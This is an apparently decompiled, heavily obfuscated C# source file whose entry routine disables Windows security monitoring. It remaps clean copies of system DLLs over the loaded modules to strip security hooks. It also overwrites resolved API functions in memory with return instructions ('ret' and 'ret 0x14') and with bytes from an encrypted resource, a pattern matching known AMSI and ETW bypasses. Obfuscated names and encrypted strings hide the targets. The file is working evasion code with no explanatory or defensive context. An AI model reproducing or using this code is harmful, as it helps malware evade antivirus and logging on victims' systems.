using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using D4HQJSCRM4;

namespace _7LNJH1YAEA;

internal static class B8DZV2ACCE
{
	private struct _0KVMPVHNPT
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
		public char[] e_magic;

		public ushort e_cblp;

		public ushort e_cp;

		public ushort e_crlc;

		public ushort e_cparhdr;

		public ushort e_minalloc;

		public ushort e_maxalloc;

		public ushort e_ss;

		public ushort e_sp;

		public ushort e_csum;

		public ushort e_ip;

		public ushort e_cs;

		public ushort e_lfarlc;

		public ushort e_ovno;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] e_res1;

		public ushort e_oemid;

		public ushort e_oeminfo;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] e_res2;

		public int e_lfanew;
	}

	[StructLayout(LayoutKind.Explicit, Size = 22)]
	private struct JTERPNN3A6
	{
		[FieldOffset(0)]
		public uint Signature;

		[FieldOffset(4)]
		public OYU3FR4VKI FileHeader;

		[FieldOffset(24)]
		public P9K8TIQDU5 OptionalHeader;
	}

	[StructLayout(LayoutKind.Explicit)]
	private struct P9K8TIQDU5
	{
		[FieldOffset(112)]
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public _6OPWW79ITT[] DataDirectory;
	}

	private struct _6OPWW79ITT
	{
		public uint VirtualAddress;

		public uint Size;
	}

	private struct OYU3FR4VKI
	{
		public ushort Machine;

		public ushort NumberOfSections;

		public uint TimeDateStamp;

		public uint PointerToSymbolTable;

		public uint NumberOfSymbols;

		public ushort SizeOfOptionalHeader;

		public ushort Characteristics;
	}

	[StructLayout(LayoutKind.Explicit)]
	private struct OHBGY0AX2G
	{
		[FieldOffset(0)]
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
		public char[] Name;

		[FieldOffset(8)]
		public uint VirtualSize;

		[FieldOffset(12)]
		public uint VirtualAddress;

		[FieldOffset(16)]
		public uint SizeOfRawData;

		[FieldOffset(20)]
		public uint PointerToRawData;

		[FieldOffset(24)]
		public uint PointerToRelocations;

		[FieldOffset(28)]
		public uint PointerToLinenumbers;

		[FieldOffset(32)]
		public ushort NumberOfRelocations;

		[FieldOffset(34)]
		public ushort NumberOfLinenumbers;

		[FieldOffset(36)]
		public ED3UW5ER4S Characteristics;

		public string SectionName => new string(Name);
	}

	[Flags]
	private enum ED3UW5ER4S : uint
	{
		TypeReg = 0u,
		TypeDsect = 1u,
		TypeNoLoad = 2u,
		TypeGroup = 4u,
		TypeNoPadded = 8u,
		TypeCopy = 0x10u,
		ContentCode = 0x20u,
		ContentInitializedData = 0x40u,
		ContentUninitializedData = 0x80u,
		LinkOther = 0x100u,
		LinkInfo = 0x200u,
		TypeOver = 0x400u,
		LinkRemove = 0x800u,
		LinkComDat = 0x1000u,
		NoDeferSpecExceptions = 0x4000u,
		RelativeGP = 0x8000u,
		MemPurgeable = 0x20000u,
		Memory16Bit = MemPurgeable,
		MemoryLocked = 0x40000u,
		MemoryPreload = 0x80000u,
		Align1Bytes = 0x100000u,
		Align2Bytes = 0x200000u,
		Align4Bytes = Align1Bytes | Align2Bytes,
		Align8Bytes = 0x400000u,
		Align16Bytes = Align1Bytes | Align8Bytes,
		Align32Bytes = Align2Bytes | Align8Bytes,
		Align64Bytes = Align4Bytes | Align8Bytes,
		Align128Bytes = 0x800000u,
		Align256Bytes = Align1Bytes | Align128Bytes,
		Align512Bytes = Align2Bytes | Align128Bytes,
		Align1024Bytes = Align4Bytes | Align128Bytes,
		Align2048Bytes = Align8Bytes | Align128Bytes,
		Align4096Bytes = Align16Bytes | Align128Bytes,
		Align8192Bytes = Align32Bytes | Align128Bytes,
		LinkExtendedRelocationOverflow = 0x1000000u,
		MemoryDiscardable = 0x2000000u,
		MemoryNotCached = 0x4000000u,
		MemoryNotPaged = 0x8000000u,
		MemoryShared = 0x10000000u,
		MemoryExecute = 0x20000000u,
		MemoryRead = 0x40000000u,
		MemoryWrite = 0x80000000u
	}

	[Flags]
	private enum NFKQR1OR3C : uint
	{
		AccessSystemSecurity = 0x1000000u,
		MaximumAllowed = 0x2000000u,
		Delete = 0x10000u,
		ReadControl = 0x20000u,
		WriteDAC = 0x40000u,
		WriteOwner = 0x80000u,
		Synchronize = 0x100000u,
		StandardRightsRequired = Delete | ReadControl | WriteDAC | WriteOwner,
		StandardRightsRead = ReadControl,
		StandardRightsWrite = ReadControl,
		StandardRightsExecute = ReadControl,
		StandardRightsAll = StandardRightsRequired | Synchronize,
		SpecificRightsAll = 0xFFFFu,
		FILE_READ_DATA = 1u,
		FILE_LIST_DIRECTORY = FILE_READ_DATA,
		FILE_WRITE_DATA = 2u,
		FILE_ADD_FILE = FILE_WRITE_DATA,
		FILE_APPEND_DATA = 4u,
		FILE_ADD_SUBDIRECTORY = FILE_APPEND_DATA,
		FILE_CREATE_PIPE_INSTANCE = FILE_APPEND_DATA,
		FILE_READ_EA = 8u,
		FILE_WRITE_EA = 0x10u,
		FILE_EXECUTE = 0x20u,
		FILE_TRAVERSE = FILE_EXECUTE,
		FILE_DELETE_CHILD = 0x40u,
		FILE_READ_ATTRIBUTES = 0x80u,
		FILE_WRITE_ATTRIBUTES = 0x100u,
		GenericRead = 0x80000000u,
		GenericWrite = 0x40000000u,
		GenericExecute = 0x20000000u,
		GenericAll = 0x10000000u,
		SPECIFIC_RIGHTS_ALL = SpecificRightsAll,
		FILE_ALL_ACCESS = StandardRightsAll | FILE_READ_DATA | FILE_WRITE_DATA | FILE_APPEND_DATA | FILE_READ_EA | FILE_WRITE_EA | FILE_EXECUTE | FILE_DELETE_CHILD | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES,
		FILE_GENERIC_READ = 0x120089u,
		FILE_GENERIC_WRITE = 0x120116u,
		FILE_GENERIC_EXECUTE = 0x1200A0u
	}

	[Flags]
	private enum O53MQZMI75 : uint
	{
		None = 0u,
		Read = 1u,
		Write = 2u,
		Delete = 4u
	}

	private enum _6LQMPK4AGJ : uint
	{
		New = 1u,
		CreateAlways,
		OpenExisting,
		OpenAlways,
		TruncateExisting
	}

	[Flags]
	private enum NN024J6VZ7 : uint
	{
		Readonly = 1u,
		Hidden = 2u,
		System = 4u,
		Directory = 0x10u,
		Archive = 0x20u,
		Device = 0x40u,
		Normal = 0x80u,
		Temporary = 0x100u,
		SparseFile = 0x200u,
		ReparsePoint = 0x400u,
		Compressed = 0x800u,
		Offline = 0x1000u,
		NotContentIndexed = 0x2000u,
		Encrypted = 0x4000u,
		Write_Through = 0x80000000u,
		Overlapped = 0x40000000u,
		NoBuffering = 0x20000000u,
		RandomAccess = 0x10000000u,
		SequentialScan = 0x8000000u,
		DeleteOnClose = 0x4000000u,
		BackupSemantics = 0x2000000u,
		PosixSemantics = 0x1000000u,
		OpenReparsePoint = 0x200000u,
		OpenNoRecall = 0x100000u,
		FirstPipeInstance = 0x80000u
	}

	private enum MT402JKRD6 : uint
	{
		PageReadonly = 2u,
		PageReadWrite = 4u,
		PageWriteCopy = 8u,
		PageExecuteRead = 32u,
		PageExecuteReadWrite = 64u,
		SectionCommit = 134217728u,
		SectionImage = 16777216u,
		SectionNoCache = 268435456u,
		SectionReserve = 67108864u
	}

	private enum S5T9VBY8AG : uint
	{
		Copy = 1u,
		Write = 2u,
		Read = 4u,
		AllAccess = 8u,
		Execute = 0x20u
	}

	private struct _6OKTZBEBSH
	{
		public IntPtr lpBaseOfDll;

		public uint SizeOfImage;

		public IntPtr EntryPoint;
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string name);

	[DllImport("kernel32.dll")]
	private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
	private static extern IntPtr CreateFileA([MarshalAs(UnmanagedType.LPStr)] string filename, [MarshalAs(UnmanagedType.U4)] NFKQR1OR3C access, [MarshalAs(UnmanagedType.U4)] O53MQZMI75 share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] _6LQMPK4AGJ creationDisposition, [MarshalAs(UnmanagedType.U4)] NN024J6VZ7 flagsAndAttributes, IntPtr templateFile);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, MT402JKRD6 flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, [MarshalAs(UnmanagedType.LPStr)] string lpName);

	[DllImport("kernel32.dll")]
	private static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, S5T9VBY8AG dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("psapi.dll")]
	private static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out _6OKTZBEBSH lpmodinfo, uint cb);

	[DllImport("kernel32.dll")]
	private static extern void CopyMemory(IntPtr destination, IntPtr source, uint length);

	private static void LVXUTUEPYK(string dllName)
	{
		IntPtr pointer = MapViewOfFile(CreateFileMapping(CreateFileA(Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + HE2HAIHY00.H3ALMMLJ7W<string>(3919340933u).Replace(HE2HAIHY00._77KSBNOLRC<string>(900626774u), Encoding.UTF8.GetString(Convert.FromBase64String(""))) + dllName, NFKQR1OR3C.GenericRead, O53MQZMI75.Read, IntPtr.Zero, _6LQMPK4AGJ.OpenExisting, (NN024J6VZ7)0u, IntPtr.Zero), IntPtr.Zero, (MT402JKRD6)16777218u, 0u, 0u, null), S5T9VBY8AG.Read, 0u, 0u, 0u);
		int num3 = default;
		OYU3FR4VKI oYU3FR4VKI = default;
		OHBGY0AX2G structure = default;
		IntPtr intPtr2 = default;
		IntPtr moduleHandle = default;
		_0KVMPVHNPT obj = default;
		while (true)
		{
			int num = -1261496074;
			while (true)
			{
				uint num2;
				uint lpflOldProtect;
				switch ((num2 = (uint)(num ^ -1562986168)) % 14)
				{
				case 11u:
					break;
				default:
					return;
				case 5u:
				{
					int num5;
					if (num3 < oYU3FR4VKI.NumberOfSections)
					{
						num = -493632179;
						num5 = num;
					}
					else
					{
						num = -961087521;
						num5 = num;
					}
					continue;
				}
				case 3u:
				{
					structure = (OHBGY0AX2G)Marshal.PtrToStructure(intPtr2 + num3 * Marshal.SizeOf(structure), typeof(OHBGY0AX2G));
					int num4;
					if (structure.SectionName.Contains(HE2HAIHY00._77KSBNOLRC<string>(3469502843u)))
					{
						num = -1924722150;
						num4 = num;
					}
					else
					{
						num = -1276298494;
						num4 = num;
					}
					continue;
				}
				case 2u:
				{
					IntPtr intPtr3 = IntPtr.Add(moduleHandle, (int)structure.VirtualAddress);
					IntPtr source = IntPtr.Add(pointer, (int)structure.VirtualAddress);
					VirtualProtect(intPtr3, (UIntPtr)structure.VirtualSize, 64u, out lpflOldProtect);
					CopyMemory(intPtr3, source, structure.VirtualSize);
					VirtualProtect(intPtr3, (UIntPtr)structure.VirtualSize, lpflOldProtect, out lpflOldProtect);
					num = ((int)num2 * -1764702222) ^ -1849734167;
					continue;
				}
				case 7u:
					num = (int)((num2 * 616786026) ^ 0x38CE72AD);
					continue;
				case 0u:
					intPtr2 = moduleHandle + obj.e_lfanew + Marshal.SizeOf(typeof(JTERPNN3A6));
					structure = default;
					num = (int)((num2 * 441992221) ^ 0x58D62ED0);
					continue;
				case 1u:
				{
					IntPtr intPtr = moduleHandle + obj.e_lfanew;
					oYU3FR4VKI = (OYU3FR4VKI)Marshal.PtrToStructure(intPtr + Marshal.SizeOf(((JTERPNN3A6)Marshal.PtrToStructure(intPtr, typeof(JTERPNN3A6))).Signature), typeof(OYU3FR4VKI));
					num = (int)(num2 * 1532879172) ^ -596330884;
					continue;
				}
				case 6u:
					obj = (_0KVMPVHNPT)Marshal.PtrToStructure(moduleHandle, typeof(_0KVMPVHNPT));
					num = (int)((num2 * 1998738652) ^ 0x29F87861);
					continue;
				case 9u:
					return;
				case 10u:
					moduleHandle = GetModuleHandle(dllName);
					num = ((int)num2 * -844118322) ^ -1986938360;
					continue;
				case 8u:
					num3++;
					num = -1373558621;
					continue;
				case 4u:
					lpflOldProtect = 0u;
					num = (int)(num2 * 1129699856) ^ -883404340;
					continue;
				case 12u:
					num3 = 0;
					num = (int)((num2 * 764204828) ^ 0x737CB763);
					continue;
				case 13u:
					return;
				}
				break;
			}
		}
	}

	private static void AFHTAN8MK5()
	{
		IntPtr procAddress = GetProcAddress(LoadLibrary(HE2HAIHY00._77KSBNOLRC<string>(1824454702u).Replace(HE2HAIHY00.H3ALMMLJ7W<string>(976711749u), Encoding.UTF8.GetString(Convert.FromBase64String("")))), HE2HAIHY00.GUWL3JV00Q<string>(3301508434u).Replace(HE2HAIHY00.GUWL3JV00Q<string>(152839343u), Encoding.UTF8.GetString(Convert.FromBase64String(""))));
		byte[] array = default;
		uint lpflOldProtect = default;
		while (true)
		{
			int num = 1320953546;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)(num ^ 0x27B077E4)) % 10)
				{
				case 2u:
					break;
				default:
					return;
				case 3u:
					array = HE2HAIHY00._8RFR98K3ZR<byte[]>(4016860635u);
					num = ((int)num2 * -1253919473) ^ 0xBF9615F;
					continue;
				case 8u:
					num = ((int)num2 * -1427705726) ^ -416201650;
					continue;
				case 4u:
					array = null;
					num = ((int)num2 * -1247094022) ^ -964543216;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (IntPtr.Size == 8)
					{
						num3 = 175090739;
						num4 = num3;
					}
					else
					{
						num3 = 523836595;
						num4 = num3;
					}
					num = num3 ^ (int)(num2 * 1491656377);
					continue;
				}
				case 1u:
					Marshal.Copy(array, 0, procAddress, array.Length);
					num = ((int)num2 * -700677010) ^ 0x49349B7;
					continue;
				case 6u:
					VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, 64u, out lpflOldProtect);
					num = 931349155;
					continue;
				case 7u:
					array = HE2HAIHY00._6C997TLR3M<byte[]>(2019554069u);
					num = 657897722;
					continue;
				case 9u:
				{
					VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, lpflOldProtect, out var _);
					num = (int)((num2 * 852955379) ^ 0x5B9A642C);
					continue;
				}
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private static void GAYCSC2O1N()
	{
		IntPtr procAddress = GetProcAddress(LoadLibrary(HE2HAIHY00._77KSBNOLRC<string>(3226373585u).Replace(HE2HAIHY00._8RFR98K3ZR<string>(4169833331u), Encoding.UTF8.GetString(Convert.FromBase64String("")))), HE2HAIHY00.GUWL3JV00Q<string>(2461328880u).Replace(HE2HAIHY00._77KSBNOLRC<string>(900626774u), Encoding.UTF8.GetString(Convert.FromBase64String(""))));
		byte[] array = default;
		uint lpflOldProtect = default;
		while (true)
		{
			int num = 650736517;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)(num ^ 0x74E19B40)) % 9)
				{
				case 4u:
					break;
				default:
					return;
				case 2u:
					array = null;
					num = ((int)num2 * -1493815182) ^ -1986600145;
					continue;
				case 6u:
					num = (int)(num2 * 703423729) ^ -532212157;
					continue;
				case 5u:
				{
					VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, lpflOldProtect, out var _);
					num = (int)((num2 * 117014026) ^ 0x10351DBA);
					continue;
				}
				case 8u:
					VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, 64u, out lpflOldProtect);
					Marshal.Copy(array, 0, procAddress, array.Length);
					num = 739411779;
					continue;
				case 7u:
					array = new byte[1] { 195 };
					num = (int)(num2 * 709594500) ^ -1722667918;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (IntPtr.Size != 8)
					{
						num3 = -168905284;
						num4 = num3;
					}
					else
					{
						num3 = -856444341;
						num4 = num3;
					}
					num = num3 ^ (int)(num2 * 313151784);
					continue;
				}
				case 0u:
					array = new byte[3] { 194, 20, 0 };
					num = 754616989;
					continue;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private static void _7EP3AWHVY2()
	{
		LVXUTUEPYK(HE2HAIHY00._8RFR98K3ZR<string>(4277944578u).Replace(HE2HAIHY00.GUWL3JV00Q<string>(152839343u), Encoding.UTF8.GetString(Convert.FromBase64String(""))));
		LVXUTUEPYK(HE2HAIHY00._6C997TLR3M<string>(2977982314u).Replace(HE2HAIHY00._8RFR98K3ZR<string>(4169833331u), Encoding.UTF8.GetString(Convert.FromBase64String(""))));
	}

	[STAThread]
	private static void NRLTNT5GGV()
	{
		AFHTAN8MK5();
		GAYCSC2O1N();
		_7EP3AWHVY2();
	}
}
